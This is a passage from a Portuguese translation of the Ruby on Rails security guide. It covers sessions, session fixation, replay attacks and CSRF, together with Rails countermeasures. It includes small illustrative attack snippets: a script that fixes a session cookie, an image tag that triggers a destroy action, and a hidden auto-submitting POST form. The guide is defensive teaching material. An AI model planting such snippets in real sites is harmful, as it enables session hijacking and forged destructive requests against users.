<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
  
<title>Guia Sobre Segurança no Ruby on Rails</title>

<link rel="stylesheet" type="text/css" href="files/stylesheets/style.css" />
<link rel="stylesheet" type="text/css" href="files/stylesheets/syntax.css" />
<link rel="stylesheet" type="text/css" href="files/stylesheets/print.css" media="print" />

<script type="text/javascript" src="files/javascripts/guides.js"></script>
<script type="text/javascript" src="files/javascripts/code_highlighter.js"></script>
<script type="text/javascript" src="files/javascripts/highlighters.js"></script>

</head>
<body class="guide">
  <div id="topNav">
    <div class="wrapper">
      <strong>Mais em <a href="http://www.rubyonrails.pro.br/">rubyonrails.pro.br:</a> </strong>
      <a href="http://www.rubyonrails.pro.br/">Geral</a> |
      <a href="http://rubyonrails.pro.br/down">Download</a> |
      <a href="http://rubyonrails.pro.br/deploy">Deploy</a> |
      <a href="http://rails.lighthouseapp.com/projects/8994-ruby-on-rails/overview">C&oacute;digo</a> |
      <a href="http://www.rubyonrails.pro.br/apresentacoes">Apresentações</a> |
      <a href="http://www.rubyonrails.pro.br/documentacao">Documentação</a> |
      <a href="http://www.rubyonrails.pro.br/ecossistema">Ecossistema</a> |
      <a href="http://www.rubyonrails.pro.br/comunidade">Comunidade</a> |
      <a href="http://podcast.rubyonrails.pro.br">Podcasts</a> |
      <a href="http://www.rubyonrails.pro.br/planeta/">Blogs</a>
    </div>
  </div>
  <div id="header">
    <div class="wrapper clearfix">
      <h1><a href="index.html" title="Retorne para a página princípal">Guides.rubyonrails.org</a></h1>
      <p class="hide"><a href="#mainCol">Pule a navegação</a>.</p>
      <ul class="nav">
        <li><a href="index.html">Início</a></li>
        <li class="index"><a href="#" onclick="guideMenu();" id="guidesMenu">Índice dos Guias</a>
          <div id="guides" class="clearfix" style="display: none;">
            <hr />
            <dl class="L">
              <dt>Start Here</dt>
              <dd><a href="getting_started.html">Começando com Rails</a></dd>
              <dt>Models</dt>
              <dd><a href="migrations.html">Rails Database Migrations</a></dd>
              <dd><a href="activerecord_validations_callbacks.html">Validações e Callbacks do Active Record</a></dd>
              <dd><a href="association_basics.html">Associações do Active Record</a></dd>
              <dd><a href="active_record_querying.html">Interface de Queries do Active Record</a></dd>
              <dt>Views</dt>
              <dd><a href="layouts_and_rendering.html">Layouts e Renderização no Rails</a></dd>
              <dd><a href="form_helpers.html">Form Helpers do Action View</a></dd>
              <dt>Controllers</dt>
              <dd><a href="action_controller_overview.html">Visão Geral do Action Controller</a></dd>
              <dd><a href="routing.html">Roteamento Rails de Fora para Dentro</a></dd>
            </dl>
            <dl class="R">
              <dt>Aprofundando</dt>
              <dd><a href="i18n.html">API de Internacionalização do Rails</a></dd>
              <dd><a href="action_mailer_basics.html">Conceitos Básicos do Action Mailer</a></dd>
              <dd><a href="testing.html">Testando Aplicações Rails</a></dd>
              <dd><a href="security.html">Segurança em Aplicações Rails</a></dd>
              <dd><a href="debugging_rails_applications.html">Depurando Aplicações Rails</a></dd>
              <dd><a href="performance_testing.html">Testando Performance em Aplicações Rails</a></dd>
              <dd><a href="plugins.html">O Básico da Criação de Plugins</a></dd>
              <dd><a href="configuring.html">Configurando Aplicações Rails</a></dd>
            </dl>
          </div>
        </li>
        <li><a href="contribute.html">Contribua</a></li>
        <li><a href="credits.html">Créditos</a></li>
      </ul>     
    </div>
  </div>
  <hr class="hide" />
  
  <div id="feature">
    <div class="wrapper">
      <h2>Guia Sobre Segurança no Ruby on Rails</h2>
<p>Este manual descreve problemas de segurança comuns em aplicações web e como evitá-los com Rails. Após lê-lo, você deverá estar familiarizado com:</p>
<ul>
	<li>Todas as precauções <em class="highlight">que estão destacadas</em></li>
	<li>O conceito de sessões no Rails, o que colocar ali e métodos de ataque populares</li>
	<li>Porque apenas visitar um site pode ser um problema de segurança (com <span class="caps">CSRF</span>)</li>
	<li>No que você deve prestar atenção quando estiver trabalhando com arquivos ou fornecendo uma interface administrativa.</li>
	<li>O problema de atribuição em massa específico do Rails</li>
	<li>Como gerenciar usuários: Realizando login e logout e métodos de ataque em todas as camadas</li>
	<li>E os métodos mais populares de ataques por injeção</li>
</ul>

            <div id="subCol">
        <h3 class="chapter"><img src="images/chapters_icon.gif" alt="" />Chapters</h3>
        <ol class="chapters">
<li><a href="#introduo">Introdução</a><ul></ul></li><li><a href="#sesses">Sessões</a><ul><li><a href="#oquesosesses">O que são sessões?</a></li><li><a href="#iddesesso">Id de sessão</a></li><li><a href="#sequestrodesesso">Sequestro de sessão</a></li><li><a href="#orientaessobresesses">Orientações sobre sessões</a></li><li><a href="#mecanismosdearmazenamentodesesso">Mecanismos de armazenamento de sessão</a></li><li><a href="#ataquesdereplayparasessesem-cookie-store">Ataques de replay para sessões em CookieStore</a></li><li><a href="#fixaodesesso">Fixação de sessão</a></li><li><a href="#fixaodesesso-medidaspreventivas">Fixação de sessão &#8211; Medidas preventivas</a></li><li><a href="#validadedasesso">Validade da sessão</a></li></ul></li><li><a href="#cross-site-reference-forgery-csrf">Cross-Site Reference Forgery (<span class="caps">CSRF</span>)</a><ul><li><a href="#medidaspreventivasparao-csrf">Medidas preventivas para o <span class="caps">CSRF</span></a></li></ul></li><li><a href="#redirecionamentoe-arquivos">Redirecionamento e Arquivos</a><ul><li><a href="#redirecionamento">Redirecionamento</a></li><li><a href="#uploadsde-arquivos">Uploads de Arquivos</a></li><li><a href="#cdigoexecutvelemuploadsdearquivos">Código executável em uploads de arquivos</a></li><li><a href="#downloadsdearquivos">Downloads de arquivos</a></li></ul></li><li><a href="#segurana-administrativaeem-intranets">Segurança Administrativa e em Intranets</a><ul><li><a href="#precauesadicionais">Precaues adicionais</a></li></ul></li><li><a href="#massassignment">Mass assignment</a><ul><li><a href="#medidaspreventivas">Medidas preventivas</a></li></ul></li><li><a href="#gerenciamentodeusurios">Gerenciamento de usuários</a><ul><li><a href="#ataquesdeforabrutacontracontas">Ataques de força bruta contra contas</a></li><li><a href="#sequestrodeconta">Sequestro de conta</a></li><li><a href="#captch-as">CAPTCHAs</a></li><li><a href="#logging">Logging</a></li><li><a href="#bonspasswords">Bons passwords</a></li><li><a href="#expressesregulares">Expressões regulares</a></li><li><a href="#aumentodeprivilgios">Aumento de privilégios</a></li></ul></li><li><a href="#injeo">Injeção</a><ul><li><a href="#whitelistsversus-blacklists">Whitelists versus Blacklists</a></li><li><a href="#sql-injection"><span class="caps">SQL</span> Injection</a></li><li><a href="#cross-site-scripting-xss">Cross-Site Scripting (<span class="caps">XSS</span>)</a></li><li><a href="#css-injection"><span class="caps">CSS</span> Injection</a></li><li><a href="#textile-injection">Textile Injection</a></li><li><a href="#ajax-injection">Ajax Injection</a></li><li><a href="#rjs-injection"><span class="caps">RJS</span> Injection</a></li><li><a href="#command-line-injection">Command Line Injection</a></li><li><a href="#header-injection">Header Injection</a></li></ul></li><li><a href="#additionalresources">Additional resources</a><ul></ul></li><li><a href="#changelog">Changelog</a><ul></ul></li></ol></div>
    </div>
  </div>

  <div id="container">
    <div class="wrapper">
      <div id="mainCol">
        <h3 id="introduo">1 Introdução</h3>
<p>Frameworks para aplicações web existem para ajudar os desenvolvedores a construir aplicações web. Alguns deles também lhe ajudam com a segurança de aplicações web. Na verdade um framework não é mais seguro que outro: Se você fizer corretamente, você poderá construir aplicações seguras com diversos frameworks. Ruby on Rails possui alguns métodos auxiliares bastante espertos, por exemplo contra injeção de <span class="caps">SQL</span>, logo isso dificilmente será um problema. É bom ver que todas as aplicações feitas com Rails que eu auditei possuem um bom nível de segurança.</p>
<p>De forma geral, não há nada parecido com &#8216;segurança plug-n-play&#8217;. Segurança depende das pessoas que estão usando o framework, e algumas vezes do método de desenvolvimento. Depende também de todas as camadas do ambiente de uma aplicação web: O sistema de armazenamento de dados, o servidor web e a aplicação web em si (e possivelmente outras camadas ou aplicações).</p>
<p>O Grupo Gartnet estima entretanto que 75% dos ataques ocorrem na camada da aplicação web, e descobriu que &#8220;dentre 300 sites auditados, 97% eram vulneráveis a ataques&#8221;. Isso ocorre porque aplicações web são relativamente fáceis de atacar, uma vez que são simples de entender e manipular, mesmo para pessoas leigas.</p>
<p>As ameaças contra aplicações web incluem sequestro da conta de usuário, burlar o controle de acesso, ler ou modificar dados sigilosos ou fornecer conteúdo fraudulento. Ou um atacante pode conseguir instalar um programa Cavalo de Tróia ou um software para envio de e-mails não solicitados, tentar enriquecer ou causar danos ao nome de uma marca alterando recursos da empresa. Para prevenir ataques, minimizar seu impacto e remover pontos de ataque, antes de mais nada você precisa entender completamente os métodos de ataque, para que seja capaz de encontrar as medidas preventivas corretas. É esse o objetivo deste guia.</p>
<p>Para desenvolver aplicações web seguras você deve se manter atualizado em todas as camadas e conhecer seus inimigos. Para manter-se atualizado assine listas de discussão sobre segurança. leia blogs sobre segurança e torne atualizações e verificações de segurança um hábito (dê uma olhada na seção Recursos Adicionais). Eu faço isso manualmente porque é assim que você encontra os problemas com segurança mais sórdidos.</p>
<h3 id="sesses">2 Sessões</h3>
<p>Um bom lugar para começar a dar uma olhada na segurança é nas sessõs, as quais podem ser vulneráveis a alguns ataques em particular.</p>
<h4 id="oquesosesses">2.1 O que são sessões?</h4>
<p>&#8212; <em><span class="caps">HTTP</span> é um protocolo que não mantém estado. Sessões fazem com o estado seja mantido.</em></p>
<p>A maioria das aplicações precisam ter controle sobre alguns aspectos relacionados ao estado de um usuário particular. Pode ser o conteúdo de um carrinho de compras ou o id do usuário atualmente autenticado. Sem a idéia de sessões, o usuário teria que se identificar, e provavelmente se autenticar, a cada nova requisição.
O Rails criará uma nova sessão automaticamente se um novo usuário acessar a aplicação, mas usará uma sessão existente se  usuário já tiver usado a aplicação anteriormente.</p>
<p>Uma sessão consiste em um hash de valores e um id de sessão, geralmente uma string com 32 caracteres, para identificar o hash. Cada cookie enviado para o browser do usuário inclui o id de sessão. No caminho inverso, o browser enviará o id de sessão para o servidor em cada request. No Rails você pode salvar e recuperar valores usando o método <tt>session</tt>:</p>
<div class="code_container"><code class="ruby">
session[:user_id] = @current_user.id
User.find(session[:user_id])
</code></div>
<h4 id="iddesesso">2.2 Id de sessão</h4>
<p>&#8212; <em>O id de sessão é um hash MD5 com 32 bytes de comprimento.</em></p>
<p>Um id de sessão consiste em um hash criado a partir de uma string aleatória. A string aleatória é composta pelo horário atual, um número aleatório entre 0 e 1, o id do processo do interpretador Ruby (basicamente um número aleatório também) e uma string constante. Atualmente é realmente muito difícil quebrar ids de sessão do Rails usando força bruta. O algorítmo MD5 não é totalmente garantido, dado que teoricamente é possível criar dois textos de entrada diferentes que resultam em um mesmo hash MD5. Entretanto, até o momento isso não teve nenhum impacto na segurança do Rails.</p>
<h4 id="sequestrodesesso">2.3 Sequestro de sessão</h4>
<p>&#8212; <em>Roubar o id de sessão de um usuário permite que um atacante use a aplicação web se passando pelo usuário.</em></p>
<p>Muitas aplicações web possuem um sistema de autenticação: um usuário fornece um username e uma senha, a aplicação web verifica estes dados e carrega o respectivo id de usuário no hash de sessão. De agora em diante, a sessão é válida. A cada novo request a aplicação irá carregar o usuário, identificado pelo id de usuário na sessão, sem a necessidade de uma nova autenticação. O id de sessão no cookie identifica a sessão.</p>
<p>Desta forma, o cookie funciona como uma autenticação temporária para a aplicação web. Qualquer um que possua um cookie de outra pessoa pode utilizar a aplicação web como se fosse essa outra pessoa &#8211; possívelmente com consequências graves. Veja a seguir algumas formas de sequestrar a sessão e suas medidas preventivas:</p>
<ul>
	<li>&#8220;Sniffar&#8221; o cookie em uma rede não segura. Uma rede <span class="caps">LAN</span> sem fios pode ser um exemplo de tal rede. Em uma rede <span class="caps">LAN</span> sem fios não encriptada é especialmente fácil escutar o tráfego de todos os clientes conectados. Esta é mais uma razão para não trabalhar a partir de uma cafeteria. Para o desenvolvedor de aplicações web, isso significa <em class="highlight">fornecer uma conexão segura através de <span class="caps">SSL</span></em>.</li>
</ul>
<ul>
	<li>A maioria das pessoas não limpa seus cookies após trabalhar em um terminal público. Assim, se o último usuário não desfizer seu login na aplicação web, você poderá usar a aplicação como se fosse este usuário. Forneça ao usuário um botão <em class="highlight">Sair</em> e torne-o <em class="highlight">visível</em>.</li>
</ul>
<ul>
	<li>Vários ataques de cross-site scripting (<span class="caps">XSS</span>) focam-se em obter o cookie do usuário. Você lê-rá mais sobre <span class="caps">XSS</span> mais à frente neste guia.</li>
</ul>
<ul>
	<li>Ao invés de roubar um cookie desconhecido do atacante, ele fixa o identificador de sessão de um usuário conhecido (no cookie). Leia mais sobre esta forma de fixação de sessão mais à frente.</li>
</ul>
<p>O objetivo principal da maioria dos atacantes é fazer dinheiro. No submundo, os preços para dados de autenticação bancários roubados variam entre US$ 10,00 e US$ 1000,00 (dependendo dos fundos disponíveis), de US$ 0,40 a US$ 20,00 para números de cartão de crédito, US$ 1,00 a US$ 8,00 para contas em sites de leilão online e de US$ 4,00 a US$ 30,00 para senhas de email, de acordo com o <a href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf">Relatório Global de Ameaças de Segurança na Internet da Symantec</a>.</p>
<h4 id="orientaessobresesses">2.4 Orientações sobre sessões</h4>
<p>&#8212; <em>Aqui estão algumas orientações gerais sobre sessões.</em></p>
<ul>
	<li><em class="highlight">Não guarde objetos muito grandes em uma sessão</em>. Ao invés disso, você deve guardá-los no banco de dados e salvar apenas o id na sessão. Isso irá eliminar dores de cabeça com sincronização e não encherá o espaço de armazenamento da sessão (dependendo do tipo de mecanismo para armazenamento de sessão que você utilizar, veja mais abaixo). Com mecanismos de armazenamento do lado servidor você pode limpar as sessões, mas com mecanismo do lado cliente este é um problema difícil de eliminar.</li>
</ul>
<ul>
	<li><em class="highlight">Não guarde dados críticos na sessão</em>. Se um usuário limpar seus cookies ou fechar seu navegador, estes dados serão perdidos. Com um mecanismo de armazenamento no lado cliente, o usuário pode ler estes dados.</li>
</ul>
<h4 id="mecanismosdearmazenamentodesesso">2.5 Mecanismos de armazenamento de sessão</h4>
<p>&#8212; <em>O Rails fornece diversos mecanismos de armazenamento para os hashes de sessão. Os mais importantes são o ActiveRecordStore e o CookieStore.</em></p>
<p>Existem diversos mecanismos para armazenamento de sessões, isto é, onde o Rails salva o hash de sessão e o id de sessão. A maioria das aplicações utiliza ActiveRecordStore (ou uma de suas variações) ao invés de armazenamento em arquivos, devido à razões de desempenho e manutenção. O ActiveRecordStore mantém o id de sessão e o hash em uma tabela no banco de dados, salvando e recuperando o hash a cada novo request.</p>
<p>O Rails 2 introduziu um novo mecanismo padrão para armazenamento de sessão, o CookieStore. O CookieStore salva o hash de sessão diretamente em um cookie no lado cliente. O servidor recupera o hash de sessão deste cookie e elimina a necessidade de um id de sessão. Isso aumenta em muito a velocidade da aplicação, mas é uma opção de armazenamento controversa e você levar em conta suas implicações com segurança:</p>
<ul>
	<li>Cookies possuem um limite de tamanho de apenas 4K. Isso não deve ser problema, uma vez que você não deve guardar grandes quantidades de dados em uma sessão, como descrito anteriormente. <em class="highlight">Normalmente não há problemas em guardar o id do usuário atual</em>.</li>
</ul>
<ul>
	<li>O cliente pode ver tudo o que você guardar na sessão, porque estes dados serão guardados em claro (na verdade codificados em base 64, logo não encriptados). Dessa forma, óbviamente, <em class="highlight">você não quer guardar nenhum segredo aqui</em>. Para prevenir adulterações na sessão, uma chave é calculada a partir da sessão e de uma palavra secreta no servidor e inserida no final do cookie.</li>
</ul>
<p>Isso significa que a segurança deste mecanismo depende desta palavra secreta (e do algorítmo de geração da chave, que por padrão é o SHA512, o qual <strong>ainda</strong> não foi quebrado). Logo, <em class="highlight">não use uma palavra secreta muito comum, ou seja, uma palavra de um dicionário ou uma que seja menor que 30 caracteres</em>. Coloque a palavra secreta em seu environment.rb:</p>
<div class="code_container"><code class="ruby">
config.action_controller.session = {
  :session_key =&gt; ‘_app_session’,
  :secret      =&gt; ‘0x0dkfj3927dkc7djdh36rkckdfzsg...’
}
</code></div>
<p>Existem, entretanto, variações do CookieStore que encriptam o hash de sessão, logo o cliente não pode vê-lo.</p>
<h4 id="ataquesdereplayparasessesem-cookie-store">2.6 Ataques de replay para sessões em CookieStore</h4>
<p>&#8212; <em>Outro tipo de ataque sobre o qual você deve estar alerta quando estiver usando CookieStore é o ataque de replay.</em></p>
<p>Funciona da seguinte maneira:</p>
<ul>
	<li>Um usuário recebe créditos, o valor é armazenado na sessão (o que é uma má idéia, de qualquer forma, mas nós iremos fazer isso para fins de demonstração).</li>
	<li>O usuário compra algo.</li>
	<li>Seu novo crédito, mais baixo, será armazenado na sessão.</li>
	<li>O lado negro do usuário o força a pegar o cookie do primeiro passo (o qual ele copiou) e substituir o cookie atual no navegador.</li>
	<li>O usuário tem seus créditos de volta.</li>
</ul>
<p>Incluir um valor aleatório na sessão resolve o problema dos ataques de replay. Um valor aleatório é válido somente uma vez, e o servidor precisa ter controle sobre todos os valores aleatórios válidos. Isso se torna ainda mais complicado se você tiver diversos servidores de aplicação (mongrels). Guardar valores aleatórios em uma tabela no banco de dados seria contra todo o propósito do CookieStore (evitar acessar o banco de dados).</p>
<p>A melhor <em class="highlight">solução contra ataques de replay é não guardar este tipo de informação na sessão, mas sim no banco de dados</em>. Neste caso guarde os créditos no banco de dados o id do usuário atual na sessão.</p>
<h4 id="fixaodesesso">2.7 Fixação de sessão</h4>
<p>&#8212; <em>Além de roubar o id de sessão do usuário, um atacante pode fixar um id de sessão conhecido. Isso é chamado de fixação de sessão.</em></p>
<p><img src="images/session_fixation.png" title="Session Fixation" alt="Session Fixation" /></p>
<p>Este ataque foca em fixar o id de sessão de um usuário conhecido do atacante e forçar o navegador do usuário a utilizar este id. Dessa forma não é necessário que o atacante roube o id de sessão. Aqui está como este ataque funciona:</p>
<ul>
	<li>O atacante cria um id de sessão válido: Ele carrega a página de login da aplicação web para a qual ele quer fixar a sessão e pega o id de sessão do cookie que vier na resposta (veja os números 1 e 2 na imagem).</li>
</ul>
<ul>
	<li>Ele possivelmente mantém a sessão. Sessões que expiram, por exemplo a cada 20 minutos, reduzem em muito o intervalo de tempo que pode ser utilizado para o ataque. Dessa forma ele precisa acessar a aplicação web de tempo em tempo para manter a sessão ativa.</li>
</ul>
<ul>
	<li>Agora o atacante forçará o navegador do usuário a utilizar este id de sessão (veja o número 3 na imagem). Como você não pode alterar um cookie de outro domínio (devido a política de mesma origem), o atacante deve executar um código JavaScript proveniente do domínio da aplicação web alvo. Injetar o código JavaScript na aplicação através de <span class="caps">XSS</span> torna este ataque possível. Aqui está um exemplo:</li>
</ul>
<div class="code_container"><code class="html">
&lt;script&gt; document.cookie=&quot;_session_id=16d5b78abb28e3d6206b60f22a03c8d9&quot;; &lt;/script&gt;
</code></div>
<p>Leia mais sobre <span class="caps">XSS</span> e injeção mais à frente.</p>
<ul>
	<li>O atacante atrai a vítima até a página infectada com o código JavaScript. Por ter acessado a página, o navegador do usuário irá alterar o id da sessão para o id fixado pelo atacante.</li>
</ul>
<ul>
	<li>Como a sessão fixada não foi utilizada, a aplicação web solicitará que o usuário se autentique.</li>
</ul>
<ul>
	<li>De agora em diante, a vítima e o atacante utilizarão a aplicação web com a mesma sessão: A sessão tornou-se válida e a vítima não notou o ataque.</li>
</ul>
<h4 id="fixaodesesso-medidaspreventivas">2.8 Fixação de sessão &#8211; Medidas preventivas</h4>
<p>&#8212; <em>Uma linha de código o protegerá contra ataques de fixação de sessão.</em></p>
<p>A medida preventiva mais eficiente é <em class="highlight">fornecer um novo identificador de sessão</em> e declarar o identificador anterior inválido logo após uma tentativa de autenticação com sucesso. Dessa forma, um atacante não pode usar o identificador da sessão fixada. Esta é também uma boa medida preventiva contra sequestro de sessão. Aqui está como criar uma nova sessão no Rails:</p>
<div class="code_container"><code class="ruby">
reset_session
</code></div>
<p>Se você utiliza o popular plugin RestfulAuthentication para manutenção de usuários, adicione <tt>reset_session</tt> à action SessionsController#create. Note que isso remove qualquer valor da sessão, <em class="highlight">você precisa transferi-los para a nova sessão</em>.</p>
<p>Outra medida preventiva é <em class="highlight">salvar propriedades específicas do usuário na sessão</em>, verificá-las a cada novo request, e negar acesso se a informação não bater.Tais propriedades poderiam ser o endereço de IP remoto ou o nome do agente (o nome do navegador), apesar do último ser menos específico do usuário. ao salvar o endereço IP, você deve ter em mente que existem provedores de serviços de Internet ou grandes organizações que colocam seus usuário atrás de proxies. <em class="highlight">Estes proxies podem mudar durante a duração de uma sessão</em>, logo estes usuários não serão capazes de utilizar sua aplicação, ou apenas poderão usá-la de forma limitada.</p>
<h4 id="validadedasesso">2.9 Validade da sessão</h4>
<p>&#8212; <em>Sessões que nunca expiram aumentam o intervalo de tempo para ataques como cross site reference forgery (<span class="caps">CSRF</span>), sequestro de sessão ou fixação de sessão.</em></p>
<p>Uma possibilidade é definir o time-stamp de validade do cookie com o id da sessão. Entretanto o usuário pode editar cookies que estão armazenados no navegador, logo expirar as sessões no servidor é mais seguro. Aqui está um exemplo de como <em class="highlight">expirar sessões em uma tabela no banco de dados</em>. Chame <tt>Session.sweep("20m")</tt> para expirar sessões que fiquem mais de 20 minutos sem serem usadas.</p>
<div class="code_container"><code class="ruby">
class Session &lt; ActiveRecord::Base
 def self.sweep(time_ago = nil)
     time = case time_ago
       when /^(\d+)m$/ then Time.now - $1.to_i.minute
       when /^(\d+)h$/ then Time.now - $1.to_i.hour
       when /^(\d+)d$/ then Time.now - $1.to_i.day
       else Time.now - 1.hour
     end
     self.delete_all &quot;updated_at &lt; '#{time.to_s(:db)}'&quot;
   end
 end
</code></div>
<p>A seção sobre fixação dee sessão introduziu o problema de manutenção de sessões. Um atacante mantendo uma sessão a cada cinco minutos pode manter a sessão ativa para sempre, apesar de você estar expirando as sessões. Uma solução simples para isso seria adicionar uma coluna <tt>created_at</tt> à tabela de sessões. Agora você pode apagar sessões que foram criadas há muito tempo atrás. Use essa linha no método <tt>sweep</tt> acima:</p>
<div class="code_container"><code class="ruby">
self.delete_all &quot;updated_at &lt; '#{time.to_s(:db)}' OR created_at &lt; '#{2.days.ago.to_s(:db)}'&quot;
</code></div>
<h3 id="cross-site-reference-forgery-csrf">3 Cross-Site Reference Forgery (<span class="caps">CSRF</span>)
&#8212; <em>Este método de ataque funciona incluindo código malicioso ou um link em uma página que acessa uma aplicação web na qual acredita-se que o usuário tenha se autenticado. Se a sessão para essa aplicação web não tiver expirado, um atacante pode executar comandos não autorizados.</em></h3>
<p><img src="images/csrf.png" title="CSRF" alt="CSRF" /></p>
<p>No capítulo sobre sessões você aprendeu que a maioria das aplicações Rails utilizam sessões armazenadas em cookies. Ou elas guardam o id de sessão no cookie e possuem um hash de sessão do lado servidor, ou todo o hash de sessão fica do lado cliente. Em qualquer um dos casos o navegador enviará o cookie a um domínio a cada nova requisição, se ele for capaz de encontrar um cookie para aquele domínio. O ponto controverso é que ele também enviará o cookie se a requisição vier de um domínio diferente. Vamos começar com um exemplo:</p>
<ul>
	<li>Bob navega por um fórum de discussão e visualiza uma mensagem criada por um hacker onde existe um elemento <span class="caps">HTML</span> de imagem forjado. O elemento referencia um comando na aplicação de gerenciamento de projetos de Bob, ao invés de um arquivo de imagem.</li>
	<li><tt>&lt;img src="http://www.webapp.com/project/1/destroy"/&gt;</tt></li>
	<li>A sessão de Bob em www.webapp.com ainda está ativa, porque ele não fez seu logout alguns minutos atrás.</li>
	<li>Por acessar a mensagem, o navegador encontra uma tag de imagem. Ele tenta carregar a imagem suspeita a partir de www.webapp.com. Como explicado anteriormente, ele também enviará o cookie com id de sessão válido.</li>
	<li>A aplicação web em www.webapp.com verifica a informação do usuário no respectivo hash de sessão e destroy o projeto com ID 1. Ele então retorna a página com o resultado da operação, o que é um resultado inesperado para o navegador, logo ele não irá exibir a imagem.</li>
	<li>Bob não percebe o ataque &#8212; Mas alguns dias mais tarde ele percebe que o projeto número um se foi.</li>
</ul>
<p>É importante perceber que a imagem forjada ou link não precisam necessariamente estar situados no domínio da aplicação web, pode estar em qualquer lugar &#8211; em um fórum, post de blog ou email.</p>
<p>O <span class="caps">CSRF</span> aparece muito raramente no <span class="caps">CVE</span> (Exposições e Vulnerabilidades Comuns) &#8212; menos de 0.1% em 2006 &#8212; mas é realmente um &#8216;gigante adormecido&#8217; [Grossman]. Esses dados estão em forte contraste com os resultados no meu trabalho em relação à segurança (e também no de outros) &#8211; <em class="highlight"><span class="caps">CSRF</span> é um problema de segurança muito importante</em>.</p>
<h4 id="medidaspreventivasparao-csrf">3.1 Medidas preventivas para o <span class="caps">CSRF</span></h4>
<p>&#8212; <em>Primeiramente, como é requerido pelo W3C, utilize <span class="caps">POST</span> e <span class="caps">GET</span> de forma correta. Além disso, um token de segurança em requesições que não sejam <span class="caps">GET</span> protegerá sua aplicação contra o <span class="caps">CSRF</span>.</em></p>
<p>O protocólo <span class="caps">HTTP</span> fornece basicamente duas formas princípais de requisiçãi &#8211; <span class="caps">GET</span> e <span class="caps">POST</span> (e outros, mas estas não são fornecidas pela maioria dos navegadores). O World Wide Web Consortium (W3C) fornece um checklist para que se escolha entre <span class="caps">GET</span> ou <span class="caps">POST</span>:</p>
<p><strong>Utilize <span class="caps">GET</span> se:</strong></p>
<ul>
	<li>A interação for como <em class="highlight">uma pergunta</em> (ou seja, é uma operação segura, como uma pesquisa, operação de leitura, etc).</li>
</ul>
<p><strong>Utilize <span class="caps">POST</span> se:</strong></p>
<ul>
	<li>A interação for como <em class="highlight">uma ordem</em>, ou</li>
	<li>A interação <em class="highlight">altera o estado do recurso de uma forma que usuário perceberia</em> (por exemplo, a assinatura de um serviço), ou</li>
	<li>O usuário <em class="highlight">deve se responsabilizar pelos resultados</em> da interação.</li>
</ul>
<p>Se a sua aplicação web for RESTful, você deve estar acostumado com os verbos <span class="caps">HTTP</span> adicionais, como <span class="caps">PUT</span> e <span class="caps">DELETE</span>. A maioria dos navegadores atuais, entretanto, não sabem como tratar tais verbos &#8211; apenas <span class="caps">GET</span> e <span class="caps">POST</span>. O Rails utiliza um campo oculto <tt>_method</tt> para tratar esta limitação.</p>
<p><em class="highlight">O método <tt>verify</tt> em um controller pode certificar que actions específicas não possam ser utilizas através de <span class="caps">GET</span></em>. Aqui está um exemplo para verificar o uso da action <tt>transfer</tt> através de <span class="caps">POST</span>. Se a ação vier utilizando qualquer outro verbo, haverã um redirecionamento para a action <tt>list</tt>.</p>
<pre>
verify :method =&gt; :post, :only =&gt; [:transfer], :redirect_to =&gt; {:action =&gt; :list}
</pre>
<p>Com a adoção do padrão RESTful no Rails 2, a simples utilização de um mapeamento na forma <tt>map.resources :your_resources</tt> no seu arquivo <strong>routes.rb</strong>, em conjunto com a correta utilização do conjunto de rotas dinamicamente gerado por essa linha de código, garante a utilização dos verbos corretos para cada tipo de ação sobre um recurso.</p>
<p>Com essas precauções, o ataque citado acima não funcionará, porque o browser enviará uma requisição <span class="caps">GET</span> para imagens, a qual não será aceita pela aplicação web.</p>
<p>Mas este foi apenas o primeiro passo, porque <em class="highlight">requests <span class="caps">POST</span> podem ser enviados automaticamente também</em>. Aqui está um exemplo de um link que exibe www.harmless.com como destino na barra de status do navegador. Na verdade esse cria um novo form dinamicamente que envia um request <span class="caps">POST</span>.</p>
<div class="code_container"><code class="html">
&lt;a href=&quot;http://www.harmless.com/&quot; onclick=&quot;
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;&quot;&gt;To the harmless survey&lt;/a&gt;
</code></div>
<p>Ou um atacante o código no evento onmouseover de uma imagem:</p>
<div class="code_container"><code class="html">
&lt;img src=&quot;http://www.harmless.com/img&quot; width=&quot;400&quot; height=&quot;400&quot; onmouseover=&quot;...&quot; /&gt;
</code></div>
<p>Existem muitas outras possibilidades, incluindo Ajax para atacar a vítima no background. A solução <em>(highlight) para este problema é incluir um token de segurança em requests que não sejam <span class="caps">GET</span></em> que casem com o que está do lado servidor. No Rails 2 ou superior, precisamos de uma única linha de código no application controller:</p>
<div class="code_container"><code class="ruby">
protect_from_forgery :secret =&gt; &quot;123456789012345678901234567890...&quot;
</code></div>
<p>Isso incluirá automaticamente um token de segurança, calculado a partir da sessão atual e de uma palavra secreta do lado servidor, em todos os formulários e requests Ajax gerados pelo Rails. Você não precisará da palavra secreta se você utilizar CookiStorage como mecanismo de armazenamento de sessions. Se o token de segurança não for o esperado, será lançada uma exceção do tipo ActioController::InvalidAuthenticityToken</p>
<p>Perceba que <em class="highlight">vulnerabilidades de cross-site scripting (<span class="caps">XSS</span>) contornam todas as proteções contra <span class="caps">CSRF</span></em>. <span class="caps">XSS</span> dá ao atacante acesso a todos os elementos em uma página, logo ele pode ler o token de segurança <span class="caps">CSRF</span> de um form ou enviar o form diretamente. Leia mais sobre <span class="caps">XSS</span> mais à frente.</p>
<h3 id="redirecionamentoe-arquivos">4 Redirecionamento e Arquivos</h3>
<p>Outra forma de vulnerabilidade de segurança envolve o uso de redirecionamento e arquivos em aplicações web.</p>
<h4 id="redirecionamento">4.1 Redirecionamento</h4>
<p>&#8212; <em>Redirecionamento em um aplicação web é uma ferramenta craker subestimada: O atacante pode não apenas enviar o usuário para um website falso mas também criar um ataque auto contido.</em></p>
